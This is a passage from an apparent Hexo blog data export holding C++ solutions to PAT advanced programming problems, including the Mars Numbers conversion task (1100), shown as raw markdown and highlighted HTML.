class=\"keyword\">int</span> b)</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"keyword\">return</span> stu[a].id &lt; stu[b].id;</div><div class=\"line\">&#125;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d%d\"</span>, &amp;n, &amp;m, &amp;k);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">int</span> x; <span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\tans[i].push_back(x);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tstu[i].id = i;</div><div class=\"line\">\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d%d\"</span>, &amp;stu[i].e, &amp;stu[i].i);</div><div class=\"line\">\t\tstu[i].s = stu[i].e + stu[i].i;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; k; j++)</div><div class=\"line\">\t\t\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;stu[i].a[j]);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"comment\">//sort</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = i; j &lt; n; j++)</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (stu[i].s &lt; stu[j].s)</div><div class=\"line\">\t\t\t\tswap(stu[i], stu[j]);</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (stu[i].s == stu[j].s &amp;&amp; stu[i].e &lt; stu[j].e)</div><div class=\"line\">\t\t\t\tswap(stu[i], stu[j]);</div><div class=\"line\">\tstu[<span class=\"number\">0</span>].g = <span class=\"number\">0</span>;</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">1</span>; i &lt; n; i++)</div><div class=\"line\">\t\tstu[i].g = (stu[i].s == stu[i - <span class=\"number\">1</span>].s &amp;&amp; stu[i].e == stu[i - <span class=\"number\">1</span>].e) ? stu[i - <span class=\"number\">1</span>].g : i;</div><div class=\"line\">\t<span class=\"comment\">/***********************************************************/</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; n; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">0</span>; j &lt; k; j++)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (ans[stu[i].a[j]][<span class=\"number\">0</span>] &gt; <span class=\"number\">0</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans[stu[i].a[j]][<span class=\"number\">0</span>]--;</div><div class=\"line\">\t\t\t\tans[stu[i].a[j]].push_back(i); <span class=\"comment\">// 压入录取学生排名</span></div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (ans[stu[i].a[j]][<span class=\"number\">0</span>] &lt;= <span class=\"number\">0</span> &amp;&amp; stu[ans[stu[i].a[j]].back()].g == stu[i].g)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\tans[stu[i].a[j]][<span class=\"number\">0</span>]--;</div><div class=\"line\">\t\t\t\tans[stu[i].a[j]].push_back(i);</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">break</span>;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"comment\">/*********************************************************/</span></div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t\tsort(ans[i].begin() + <span class=\"number\">1</span>, ans[i].end(), cmp);</div><div class=\"line\">\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; m; i++)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = <span class=\"number\">1</span>; j &lt; ans[i].size(); j++)</div><div class=\"line\">\t\t\t(j == <span class=\"number\">1</span>) ? <span class=\"built_in\">printf</span>(<span class=\"string\">\"%d\"</span>, stu[ans[i][j]].id) : <span class=\"built_in\">printf</span>(<span class=\"string\">\" %d\"</span>, stu[ans[i][j]].id);</div><div class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">\"\\n\"</span>);</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>"},{"title":"PAT advanced 1100","date":"2017-02-01T14:10:39.000Z","_content":"\n## Description\n\n>  1100.Mars Numbers(20)\n\n> Zero on Earth is called \"tret\" on Mars.\nThe numbers 1 to 12 on Earch is called \"jan, feb, mar, apr, may, jun, jly, aug, sep, oct, nov, dec\" on Mars, respectively.\nFor the next higher digit, Mars people name the 12 numbers as \"tam, hel, maa, huh, tou, kes, hei, elo, syy, lok, mer, jou\", respectively.\nFor examples, the number 29 on Earth is called \"hel mar\" on Mars; and \"elo nov\" on Mars corresponds to 115 on Earth. In order to help communication between people from these two planets, you are supposed to write a program for mutual translation between Earth and Mars number systems.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains a positive integer N (< 100). Then N lines follow, each contains a number in [0, 169), given either in the form of an Earth number, or that of Mars.\n\n> Output Specification:\n\n> For each number, print in a line the corresponding number in the other language.\n\n> Sample Input:\n4\n29\n5\nelo nov\ntam\n\n>Sample Output:\nhel mar\nmay\n115\n13\n\n学习了`sscanf(&src, format, &dest)`这个函数，从`&src`输入字符串到`&dest`。\n而且还有个坑，`13`在这里不是`tam tret`而是`tam`\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include<algorithm>\n\nusing namespace std;\n\nstring low[13] = { \"tret\", \"jan\", \"feb\", \"mar\", \"apr\", \"may\", \"jun\", \"jly\", \"aug\", \"sep\", \"oct\", \"nov\", \"dec\" };\nstring high[13] = { \"\" ,\"tam\", \"hel\", \"maa\", \"huh\", \"tou\", \"kes\", \"hei\", \"elo\", \"syy\", \"lok\", \"mer\", \"jou\" };\n\nconst int maxSize = 50;\nchar s[maxSize];\nint n, x, ans;\nstring current;\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tgetchar();\n\twhile (n--)\n\t{\n\t\tgets(s);\n\t\tif (s[0] <= '9' && s[0] >= '0')\n\t\t{\n\t\t\tsscanf(s, \"%d\", &x);\n\t\t\tif (!(x / 13)){ cout << low[x] << endl; continue; }\n\t\t\tif (x / 13 && x % 13){ cout << high[x / 13] << ' ' << low[x % 13] << endl; continue; }\n\t\t\tif (x / 13 && !(x % 13)){ cout << high[x / 13] << endl; continue; }\n\t\t}\n\t\telse\n\t\t{\n\t\t\tans = 0;\n\t\t\tif (strlen(s) != 4)\n\t\t\t{\n\t\t\t\tfor (int i = 0; !i || s[i - 1]; i += 4)\n\t\t\t\t{\n\t\t\t\t\tcurrent = \"\";\n\t\t\t\t\tfor (int j = i; j < i + 3; j++)\n\t\t\t\t\t\tcurrent += s[j];\n\t\t\t\t\tfor (int i = 0; i < 13; i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (current == high[i]) ans += i * 13;\n\t\t\t\t\t\tif (current == low[i]) ans += i;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tcout << ans << endl;\n\t\t}\n\t}\n\treturn 0;\n}\n```\n","source":"_posts/PAT-advanced-1100.md","raw":"---\ntitle: PAT advanced 1100\ntags: [PAT]\ncategories: []\ndate: 2017-02-01 22:10:39\n---\n\n## Description\n\n>  1100.Mars Numbers(20)\n\n> Zero on Earth is called \"tret\" on Mars.\nThe numbers 1 to 12 on Earch is called \"jan, feb, mar, apr, may, jun, jly, aug, sep, oct, nov, dec\" on Mars, respectively.\nFor the next higher digit, Mars people name the 12 numbers as \"tam, hel, maa, huh, tou, kes, hei, elo, syy, lok, mer, jou\", respectively.\nFor examples, the number 29 on Earth is called \"hel mar\" on Mars; and \"elo nov\" on Mars corresponds to 115 on Earth. In order to help communication between people from these two planets, you are supposed to write a program for mutual translation between Earth and Mars number systems.\n\n> Input Specification:\n\n> Each input file contains one test case. For each case, the first line contains a positive integer N (< 100). Then N lines follow, each contains a number in [0, 169), given either in the form of an Earth number, or that of Mars.\n\n> Output Specification:\n\n> For each number, print in a line the corresponding number in the other language.\n\n> Sample Input:\n4\n29\n5\nelo nov\ntam\n\n>Sample Output:\nhel mar\nmay\n115\n13\n\n学习了`sscanf(&src, format, &dest)`这个函数，从`&src`输入字符串到`&dest`。\n而且还有个坑，`13`在这里不是`tam tret`而是`tam`\n\n## Code\n\n```\n#include <cstdio>\n#include <queue>\n#include <vector>\n#include <cstring>\n#include <string>\n#include <iostream>\n#include<algorithm>\n\nusing namespace std;\n\nstring low[13] = { \"tret\", \"jan\", \"feb\", \"mar\", \"apr\", \"may\", \"jun\", \"jly\", \"aug\", \"sep\", \"oct\", \"nov\", \"dec\" };\nstring high[13] = { \"\" ,\"tam\", \"hel\", \"maa\", \"huh\", \"tou\", \"kes\", \"hei\", \"elo\", \"syy\", \"lok\", \"mer\", \"jou\" };\n\nconst int maxSize = 50;\nchar s[maxSize];\nint n, x, ans;\nstring current;\n\nint main()\n{\n\tscanf(\"%d\", &n);\n\tgetchar();\n\twhile (n--)\n\t{\n\t\tgets(s);\n\t\tif (s[0] <= '9' && s[0] >= '0')\n\t\t{\n\t\t\tsscanf(s, \"%d\", &x);\n\t\t\tif (!(x / 13)){ cout << low[x] << endl; continue; }\n\t\t\tif (x / 13 && x % 13){ cout << high[x / 13] << ' ' << low[x % 13] << endl; continue; }\n\t\t\tif (x / 13 && !(x % 13)){ cout << high[x / 13] << endl; continue; }\n\t\t}\n\t\telse\n\t\t{\n\t\t\tans = 0;\n\t\t\tif (strlen(s) != 4)\n\t\t\t{\n\t\t\t\tfor (int i = 0; !i || s[i - 1]; i += 4)\n\t\t\t\t{\n\t\t\t\t\tcurrent = \"\";\n\t\t\t\t\tfor (int j = i; j < i + 3; j++)\n\t\t\t\t\t\tcurrent += s[j];\n\t\t\t\t\tfor (int i = 0; i < 13; i++)\n\t\t\t\t\t{\n\t\t\t\t\t\tif (current == high[i]) ans += i * 13;\n\t\t\t\t\t\tif (current == low[i]) ans += i;\n\t\t\t\t\t}\n\t\t\t\t}\n\t\t\t}\n\t\t\tcout << ans << endl;\n\t\t}\n\t}\n\treturn 0;\n}\n```\n","slug":"PAT-advanced-1100","published":1,"updated":"2017-02-02T18:35:21.222Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k0w002qhv181rlmyjx5","content":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p> 1100.Mars Numbers(20)</p>\n<p>Zero on Earth is called “tret” on Mars.<br>The numbers 1 to 12 on Earch is called “jan, feb, mar, apr, may, jun, jly, aug, sep, oct, nov, dec” on Mars, respectively.<br>For the next higher digit, Mars people name the 12 numbers as “tam, hel, maa, huh, tou, kes, hei, elo, syy, lok, mer, jou”, respectively.<br>For examples, the number 29 on Earth is called “hel mar” on Mars; and “elo nov” on Mars corresponds to 115 on Earth. In order to help communication between people from these two planets, you are supposed to write a program for mutual translation between Earth and Mars number systems.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains a positive integer N (&lt; 100). Then N lines follow, each contains a number in [0, 169), given either in the form of an Earth number, or that of Mars.</p>\n<p>Output Specification:</p>\n<p>For each number, print in a line the corresponding number in the other language.</p>\n<p>Sample Input:<br>4<br>29<br>5<br>elo nov<br>tam</p>\n<p>Sample Output:<br>hel mar<br>may<br>115<br>13</p>\n</blockquote>\n<p>学习了<code>sscanf(&amp;src, format, &amp;dest)</code>这个函数，从<code>&amp;src</code>输入字符串到<code>&amp;dest</code>。<br>而且还有个坑，<code>13</code>在这里不是<code>tam tret</code>而是<code>tam</code></p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">string</span> low[<span class=\"number\">13</span>] = &#123; <span class=\"string\">\"tret\"</span>, <span class=\"string\">\"jan\"</span>, <span class=\"string\">\"feb\"</span>, <span class=\"string\">\"mar\"</span>, <span class=\"string\">\"apr\"</span>, <span class=\"string\">\"may\"</span>, <span class=\"string\">\"jun\"</span>, <span class=\"string\">\"jly\"</span>, <span class=\"string\">\"aug\"</span>, <span class=\"string\">\"sep\"</span>, <span class=\"string\">\"oct\"</span>, <span class=\"string\">\"nov\"</span>, <span class=\"string\">\"dec\"</span> &#125;;</div><div class=\"line\"><span class=\"built_in\">string</span> high[<span class=\"number\">13</span>] = &#123; <span class=\"string\">\"\"</span> ,<span class=\"string\">\"tam\"</span>, <span class=\"string\">\"hel\"</span>, <span class=\"string\">\"maa\"</span>, <span class=\"string\">\"huh\"</span>, <span class=\"string\">\"tou\"</span>, <span class=\"string\">\"kes\"</span>, <span class=\"string\">\"hei\"</span>, <span class=\"string\">\"elo\"</span>, <span class=\"string\">\"syy\"</span>, <span class=\"string\">\"lok\"</span>, <span class=\"string\">\"mer\"</span>, <span class=\"string\">\"jou\"</span> &#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxSize = <span class=\"number\">50</span>;</div><div class=\"line\"><span class=\"keyword\">char</span> s[maxSize];</div><div class=\"line\"><span class=\"keyword\">int</span> n, x, ans;</div><div class=\"line\"><span class=\"built_in\">string</span> current;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\tgetchar();</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tgets(s);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (s[<span class=\"number\">0</span>] &lt;= <span class=\"string\">'9'</span> &amp;&amp; s[<span class=\"number\">0</span>] &gt;= <span class=\"string\">'0'</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">sscanf</span>(s, <span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!(x / <span class=\"number\">13</span>))&#123; <span class=\"built_in\">cout</span> &lt;&lt; low[x] &lt;&lt; <span class=\"built_in\">endl</span>; <span class=\"keyword\">continue</span>; &#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (x / <span class=\"number\">13</span> &amp;&amp; x % <span class=\"number\">13</span>)&#123; <span class=\"built_in\">cout</span> &lt;&lt; high[x / <span class=\"number\">13</span>] &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; low[x % <span class=\"number\">13</span>] &lt;&lt; <span class=\"built_in\">endl</span>; <span class=\"keyword\">continue</span>; &#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (x / <span class=\"number\">13</span> &amp;&amp; !(x % <span class=\"number\">13</span>))&#123; <span class=\"built_in\">cout</span> &lt;&lt; high[x / <span class=\"number\">13</span>] &lt;&lt; <span class=\"built_in\">endl</span>; <span class=\"keyword\">continue</span>; &#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tans = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(s) != <span class=\"number\">4</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; !i || s[i - <span class=\"number\">1</span>]; i += <span class=\"number\">4</span>)</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tcurrent = <span class=\"string\">\"\"</span>;</div><div class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = i; j &lt; i + <span class=\"number\">3</span>; j++)</div><div class=\"line\">\t\t\t\t\t\tcurrent += s[j];</div><div class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">13</span>; i++)</div><div class=\"line\">\t\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (current == high[i]) ans += i * <span class=\"number\">13</span>;</div><div class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (current == low[i]) ans += i;</div><div class=\"line\">\t\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; ans &lt;&lt; <span class=\"built_in\">endl</span>;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t&#125;</div><div class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">0</span>;</div><div class=\"line\">&#125;</div></pre></td></tr></table></figure>\n","excerpt":"","more":"<h2 id=\"Description\"><a href=\"#Description\" class=\"headerlink\" title=\"Description\"></a>Description</h2><blockquote>\n<p> 1100.Mars Numbers(20)</p>\n<p>Zero on Earth is called “tret” on Mars.<br>The numbers 1 to 12 on Earch is called “jan, feb, mar, apr, may, jun, jly, aug, sep, oct, nov, dec” on Mars, respectively.<br>For the next higher digit, Mars people name the 12 numbers as “tam, hel, maa, huh, tou, kes, hei, elo, syy, lok, mer, jou”, respectively.<br>For examples, the number 29 on Earth is called “hel mar” on Mars; and “elo nov” on Mars corresponds to 115 on Earth. In order to help communication between people from these two planets, you are supposed to write a program for mutual translation between Earth and Mars number systems.</p>\n<p>Input Specification:</p>\n<p>Each input file contains one test case. For each case, the first line contains a positive integer N (&lt; 100). Then N lines follow, each contains a number in [0, 169), given either in the form of an Earth number, or that of Mars.</p>\n<p>Output Specification:</p>\n<p>For each number, print in a line the corresponding number in the other language.</p>\n<p>Sample Input:<br>4<br>29<br>5<br>elo nov<br>tam</p>\n<p>Sample Output:<br>hel mar<br>may<br>115<br>13</p>\n</blockquote>\n<p>学习了<code>sscanf(&amp;src, format, &amp;dest)</code>这个函数，从<code>&amp;src</code>输入字符串到<code>&amp;dest</code>。<br>而且还有个坑，<code>13</code>在这里不是<code>tam tret</code>而是<code>tam</code></p>\n<h2 id=\"Code\"><a href=\"#Code\" class=\"headerlink\" title=\"Code\"></a>Code</h2><figure class=\"highlight cpp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstdio&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;queue&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;vector&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;cstring&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;string&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span> <span class=\"meta-string\">&lt;iostream&gt;</span></span></div><div class=\"line\"><span class=\"meta\">#<span class=\"meta-keyword\">include</span><span class=\"meta-string\">&lt;algorithm&gt;</span></span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">using</span> <span class=\"keyword\">namespace</span> <span class=\"built_in\">std</span>;</div><div class=\"line\"></div><div class=\"line\"><span class=\"built_in\">string</span> low[<span class=\"number\">13</span>] = &#123; <span class=\"string\">\"tret\"</span>, <span class=\"string\">\"jan\"</span>, <span class=\"string\">\"feb\"</span>, <span class=\"string\">\"mar\"</span>, <span class=\"string\">\"apr\"</span>, <span class=\"string\">\"may\"</span>, <span class=\"string\">\"jun\"</span>, <span class=\"string\">\"jly\"</span>, <span class=\"string\">\"aug\"</span>, <span class=\"string\">\"sep\"</span>, <span class=\"string\">\"oct\"</span>, <span class=\"string\">\"nov\"</span>, <span class=\"string\">\"dec\"</span> &#125;;</div><div class=\"line\"><span class=\"built_in\">string</span> high[<span class=\"number\">13</span>] = &#123; <span class=\"string\">\"\"</span> ,<span class=\"string\">\"tam\"</span>, <span class=\"string\">\"hel\"</span>, <span class=\"string\">\"maa\"</span>, <span class=\"string\">\"huh\"</span>, <span class=\"string\">\"tou\"</span>, <span class=\"string\">\"kes\"</span>, <span class=\"string\">\"hei\"</span>, <span class=\"string\">\"elo\"</span>, <span class=\"string\">\"syy\"</span>, <span class=\"string\">\"lok\"</span>, <span class=\"string\">\"mer\"</span>, <span class=\"string\">\"jou\"</span> &#125;;</div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">const</span> <span class=\"keyword\">int</span> maxSize = <span class=\"number\">50</span>;</div><div class=\"line\"><span class=\"keyword\">char</span> s[maxSize];</div><div class=\"line\"><span class=\"keyword\">int</span> n, x, ans;</div><div class=\"line\"><span class=\"built_in\">string</span> current;</div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">main</span><span class=\"params\">()</span></span></div><div class=\"line\">&#123;</div><div class=\"line\">\t<span class=\"built_in\">scanf</span>(<span class=\"string\">\"%d\"</span>, &amp;n);</div><div class=\"line\">\tgetchar();</div><div class=\"line\">\t<span class=\"keyword\">while</span> (n--)</div><div class=\"line\">\t&#123;</div><div class=\"line\">\t\tgets(s);</div><div class=\"line\">\t\t<span class=\"keyword\">if</span> (s[<span class=\"number\">0</span>] &lt;= <span class=\"string\">'9'</span> &amp;&amp; s[<span class=\"number\">0</span>] &gt;= <span class=\"string\">'0'</span>)</div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\t<span class=\"built_in\">sscanf</span>(s, <span class=\"string\">\"%d\"</span>, &amp;x);</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (!(x / <span class=\"number\">13</span>))&#123; <span class=\"built_in\">cout</span> &lt;&lt; low[x] &lt;&lt; <span class=\"built_in\">endl</span>; <span class=\"keyword\">continue</span>; &#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (x / <span class=\"number\">13</span> &amp;&amp; x % <span class=\"number\">13</span>)&#123; <span class=\"built_in\">cout</span> &lt;&lt; high[x / <span class=\"number\">13</span>] &lt;&lt; <span class=\"string\">' '</span> &lt;&lt; low[x % <span class=\"number\">13</span>] &lt;&lt; <span class=\"built_in\">endl</span>; <span class=\"keyword\">continue</span>; &#125;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (x / <span class=\"number\">13</span> &amp;&amp; !(x % <span class=\"number\">13</span>))&#123; <span class=\"built_in\">cout</span> &lt;&lt; high[x / <span class=\"number\">13</span>] &lt;&lt; <span class=\"built_in\">endl</span>; <span class=\"keyword\">continue</span>; &#125;</div><div class=\"line\">\t\t&#125;</div><div class=\"line\">\t\t<span class=\"keyword\">else</span></div><div class=\"line\">\t\t&#123;</div><div class=\"line\">\t\t\tans = <span class=\"number\">0</span>;</div><div class=\"line\">\t\t\t<span class=\"keyword\">if</span> (<span class=\"built_in\">strlen</span>(s) != <span class=\"number\">4</span>)</div><div class=\"line\">\t\t\t&#123;</div><div class=\"line\">\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; !i || s[i - <span class=\"number\">1</span>]; i += <span class=\"number\">4</span>)</div><div class=\"line\">\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\tcurrent = <span class=\"string\">\"\"</span>;</div><div class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> j = i; j &lt; i + <span class=\"number\">3</span>; j++)</div><div class=\"line\">\t\t\t\t\t\tcurrent += s[j];</div><div class=\"line\">\t\t\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; <span class=\"number\">13</span>; i++)</div><div class=\"line\">\t\t\t\t\t&#123;</div><div class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (current == high[i]) ans += i * <span class=\"number\">13</span>;</div><div class=\"line\">\t\t\t\t\t\t<span class=\"keyword\">if</span> (current == low[i]) ans += i;</div><div class=\"line\">\t\t\t\t\t&#125;</div><div class=\"line\">\t\t\t\t&#125;</div><div class=\"line\">\t\t\t&#125;</div><div class=\"line\">\t\t\t<span class=\"built_in\">cout</span> &lt;&lt; ans 